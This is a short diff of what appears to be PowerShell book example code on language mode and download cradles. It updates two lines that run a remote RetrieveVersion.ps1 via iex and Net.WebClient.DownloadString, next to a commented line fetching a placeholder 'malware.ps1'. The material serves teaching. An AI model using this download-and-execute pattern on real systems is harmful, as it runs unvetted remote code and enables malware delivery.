@@ -7,7 +7,7 @@ $ExecutionContext.SessionState.LanguageMode
 
 #(New ObjectNet.WebClient).DownloadString(‘https://[website]/malware.ps1′)
 #example with $PSVersionTable
-iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ddneves/Book_Learn_PowerShell/master/Ch1/RetrieveVersion.ps1'))
+iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PacktPublishing/Learn-PowerShell-Core-6.0/master/Chapter01/RetrieveVersion.ps1'))
 
 #endregion
 
@@ -23,7 +23,7 @@ $ExecutionContext.SessionState.LanguageMode
 
 #(New ObjectNet.WebClient).DownloadString(‘https://[website]/malware.ps1′)
 #example with $PSVersionTable
-iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/ddneves/Book_Learn_PowerShell/master/Ch1/RetrieveVersion.ps1'))
+iex ((New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PacktPublishing/Learn-PowerShell-Core-6.0/master/Chapter01/RetrieveVersion.ps1'))
 
 #endregion
 
